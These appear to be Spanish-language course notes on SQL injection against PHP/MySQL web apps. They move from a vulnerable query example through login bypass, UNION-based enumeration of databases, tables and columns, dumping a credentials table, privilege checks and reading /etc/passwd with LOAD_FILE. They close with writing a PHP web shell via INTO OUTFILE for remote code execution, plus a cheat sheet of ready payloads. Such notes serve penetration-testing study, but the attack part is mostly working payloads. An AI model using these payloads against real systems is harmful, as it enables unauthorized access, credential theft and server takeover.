Al realizar una petición a una base de datos a través de una aplicación web es procesado por un código PHP que conecta el formulario con la base de datos en cuestión para hacer las querys. El código sería algo parecido a esto:

```php

$searchInput =  $_POST['findUser'];

$query = "select * from logins where username like '%$searchInput'";

$result = $conn->query($query);

```

Procesando la entrada del usuario directamente, por lo que puede ser vulnerable a SQL injection.

En el ejemplo anterior, al no estar sanitizado, se puede meter una comilla para salir de la zona dónde metemos el input y hacer más sentencia SQL. Por ejemplo:

```php

'%1'; DROP TABLE users;'

```

Quedando la sentencia de esta forma:

```sql

select * from logins where username like '%1'; DROP TABLE users;'

```

Este ejemplo es solo válido en bases de datos que permiten varias sentencias en una sola línea, como MSSQL y PostgreSQL.

Para evitar recibir error al hacer estos ataques, tenemos que utilizar comentarios para que toda la parte de la sentencia que no necesitamos, no nos provoque el error.

Las querys funcionan de la siguiente forma:

```sql

SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';

```
Si el usuario y la contraseña existen en la base de datos devolverá un TRUE y se podrá loggear.

  

### Tipo de SQLi
#### In-band

Se produce cuando el resultado de la query es printeado en el front-end directamente. Existen dos tipos en este caso.

##### Union based

Especificamos la localización de la información que queremos extraer.

##### Error based

Recibimos errores de PHP o SQL con los que podemos conseguir que se printee la query.

  

#### Blind-SQL
##### Boolean based

Controlamos lo que la página devuelve, TRUE o FALSE.

  

#### Time Based

Utilizamos payloads para que si retornan TRUE se ejecute un sleep(x) y la página esté cargando x tiempo.

  

#### Out-of-band

En ocasiones no tendremos acceso al output y habrá que redirigirlo a un servidor remoto dónde luego tendremos que recuperar la información.

  

### SQLi discovery

Primero de todo, hay que comprobar que la página de login sea vulnerable a SQLi, para ello tenemos algunos payloads:

  |Payload|URL Encoded|
|---|---|
|`'`|`%27`|
|`"`|`%22`|
|`#`|`%23`|
|`;`|`%3B`|
|`)`|`%29`|
Si al enviar estas querys recibimos algún tipo de error, estamos frente a una vulnerabilidad SQLi.

  

### OR injection

  

Para poder bypassear el login podemos intentar recibir un TRUE. Esto lo haremos con un usuario conocido como puede ser admin y añadiendo un caso que siempre va a ser TRUE.

```sql

SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';

```

Para ello hemos inyectado el payload

```sql

admin' or '1'='1

  

```

Lo que retornará TRUE.

  

El problema viene cuando no tenemos tampoco un nombre de usuario por o que tenemos que incluir también el payload en la password y recibir el TRUE.

  

### Comentarios
Los comentarios en mysql son -- y #. También se utiliza /**/ pero no es común usarlo en SQL injections. Se puede utilizar para ignorar una parte de la sentencia y poder bypassear. Por ejemplo con el payload admin'-- . Se suele poner un espacio para algunas bases de datos.

  

```sql

SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';

```

  

### Union based attacks
La sentencia UNION sirve para hacer una petición a la base de datos en una misma línea. Se utiliza en combinación del SELECT para poder exfiltrar información y no puede hacer otro tipo de sentencia, solo SELECT.

  

En la siguiente Query

```sql

SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '

```

  

Esto solo funciona cuando los dos SELECT tienen las mismas columnas, por lo que en ocasiones, habrá que rellenar las columnas con lo llamado junk data. Estos datos tienen que ser del tipo de dato que corresponde la columna. En sqli más avanzados utilizaremos el NULL que corresponde a todos los tipos de datos.

Si por ejemplo nosotros queremos extraer solo la columna de usuarios y la tabla cuenta con más columnas rellenaríamos de esta forma:

  

```sql

UNION SELECT username, 2, 3, 4 from passwords-- '

```

  

#### Descubrir columnas
##### ORDER BY
Con esta Query hay que ir probando hasta que diga que el número de columna no existe.

```sql

' order by 1-- -

```

En el número anterior al número de columna que no existe será el número de columnas con el que cuenta la tabla.

##### UNION
Otra forma es con la sentencia UNION, probando diferente cantidad de columnas:

```sql

cn' UNION select 1,2,3-- -

```

```sql

cn' UNION select 1,2,3,4-- -

```

Hasta que no salte un error.

  

De esta forma se printearán el junk data, pero estos datos los podemos sustituir por datos de utilidad, por ejemplo con la etiqueta @@version con la que recibiremos la versión de la base de datos en lugar del número.

```sql

cn' UNION select 1,@@version,3,4-- -

```


### Database enumeration

Comprobación de que la base de datos es MySql:

|Payload|When to Use|Expected Output|Wrong Output|
|---|---|---|---|
|`SELECT @@version`|When we have full query output|MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`'|In MSSQL it returns MSSQL version. Error with other DBMS.|
|`SELECT POW(1,1)`|When we only have numeric output|`1`|Error with other DBMS|
|`SELECT SLEEP(5)`|Blind/No Output|Delays page response for 5 seconds and returns `0`.|Will not delay response with other DBMS|

  

Para extraer datos de las DBs hace falta la siguiente información:

- Nombre de databases

- Nombre de tablas de cada database

- Nombre de columnas de cada tabla

  

Para ello existe la database INFORMATION_SCHEMA en la mayoría de bases de datos(menos oracle) dónde hay información de las tablas en el servidor.

Para poder acceder a una DB sin utilizar el comando USE se puede utilizar el '.' de tal forma que se ponga primero la database y luego la tabla a la que se quiere acceder.

```sql

SELECT * FROM my_database.users;

```

De esta forma poder ver las tablas de la DB INFORMATION_SCHEMA. 

Para enumerar el nombre de las DBs utilizaríamos la siguiente Query:

```shell-session

mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

  

+--------------------+

| SCHEMA_NAME        |

+--------------------+

| mysql              |

| information_schema |

| performance_schema |

| ilfreight          |

| dev                |

+--------------------+

6 rows in set (0.01 sec)

```

Las primeras 3 son predeterminadas de Mysql, en ocasiones también está la base de datos sys.

Se puede utilizar también la columna tables y columns para enumerar información.

```
SELECT * FROM information_schema.tables

TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE ===================================================== 
MyDatabase dbo Products BASE TABLE 
MyDatabase dbo Users BASE TABLE 
MyDatabase dbo Feedback BASE TABLE

SELECT * FROM information_schema.columns WHERE table_name = 'Users'

TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE ================================================================= MyDatabase dbo Users UserId int 
MyDatabase dbo Users Username varchar 
MyDatabase dbo Users Password varchar
```

La inyección tendría esta froma:

```sql

cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -

```

Se puede utilizar también un `select *`.

Para ver la database que se está usando usaríamos la función database():

```sql

cn' UNION select 1,database(),2,3-- -

```

  

Para extraer información sobre el nombre de la tabla, debemos utilizar el siguiente payload:

```sql

cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -

```

Dónde table_name guarda el nombre de las tablas, table_schema el nombre de la db al que pertenecen, information_schema.tables sería la tabla dentro de la base de datos de información y especifica que la base de datos debe ser 'dev'.

  

Una vez tenemos el nombre de las tablas, podemos intentar conseguir el de las columnas para extraer información.

```sql

cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -

```

Aquí usamos column_name para extraer el nombre de la columna, table_name para saber la tabla asociada y table_schema para la base de datos que pertenencen para luego en el where especificar que solo queremos la información de la tabla con el nombre credentials.

  

Teniendo toda esta información podemos extraer ya datos. Simplemente con una query normal especificando el nombre de las columnas de las que queremos los datos y la base de datos y su tabla de dónde lo vamos a extraer.

```sql

cn' UNION select 1, username, password, 4 from dev.credentials-- -

```

### RCE
La base de datos puede ser gestionada por un usuario que tenga privilegios o no, lo más común es que tenga al menos de lectura. Lo primero que habría que hacer sería ver el usuario de la misma forma que estábamos exfiltrando información.

```sql

cn' UNION SELECT 1, user(), 3, 4-- -

```

```sql

cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -

```

  

Para saber los privilegios del usuario, si es super usuario, usamos la columna super_priv de la tabla mysql.user.

```sql

cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -

```

Y si tenemos muchos usuarios especificamos el que hemos descubierto que es el nuestro.

```sql

cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -

```

Si la Query retorna una Y significa que es Yes a si tenemos privilegios de superusuario.

Para ver todos los privilegios que tiene sería de esta forma:

```sql

cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -

```

Añadiendo un where garantee="'user'@'localhost'" si hay muchos usuarios.

Si contamos con permisos para el comando FILE podemos leer archivos y potencialmente escribir con ellos.

La función para leer archivos sería la siguiente:

```sql

cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -

```

Se puede utilizar para filtrar el código de las páginas web.

  

Para poder escribir en archivos y poder tener el RCE necesitamos tres cosas.

El usuario debe tener el privilegio file activado.

La variable mysql secure_file_priv debe estar desactivada.

Tener permisos de escritura el la localización que queremos escribir.

  

secure_file_priv

  

De esta forma comprobamos si está desactivada, aunque normalmente de forma predeterminada está activada. Esto solo sirve en mysql y MariaDB.

```sql

cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -

```

  

Para escribir archivos podemos hacerlo de esta forma:

  

```sql

cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -

```

  

#### Escribir una web-shell

  

```sql

cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -

```

Con este payload podemos entrar en el archivo shell.php y con el valor 0 podemos introducir comandos y conseguir un RCE.

http://server_ip:80/shel.php?0=id

|   |   |
|---|---|
|Payload|Description|
|Auth Bypass||
|admin' or '1'='1|Basic Auth Bypass|
|admin')-- -|Basic Auth Bypass With comments|
|[Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)||
|Union Injection||
|' order by 1-- -|Detect number of columns using order by|
|cn' UNION select 1,2,3-- -|Detect number of columns using Union injection|
|cn' UNION select 1,@@version,3,4-- -|Basic Union injection|
|UNION select username, 2, 3, 4 from passwords-- -|Union injection for 4 columns|
|DB Enumeration||
|SELECT @@version|Fingerprint MySQL with query output|
|SELECT SLEEP(5)|Fingerprint MySQL with no output|
|cn' UNION select 1,database(),2,3-- -|Current database name|
|cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -|List all databases|
|cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -|List all tables in a specific database|
|cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -|List all columns in a specific table|
|cn' UNION select 1, username, password, 4 from dev.credentials-- -|Dump data from a table in another database|
|Privileges||
|cn' UNION SELECT 1, user(), 3, 4-- -|Find current user|
|cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -|Find if user has admin privileges|
|cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -|Find if all user privileges|
|cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -|Find which directories can be accessed through MySQL|
|File Injection||
|cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -|Read local file|
|select 'file written successfully!' into outfile '/var/www/html/proof.txt'|Write a string to a local file|
|cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -|Write a web shell into the base web directory|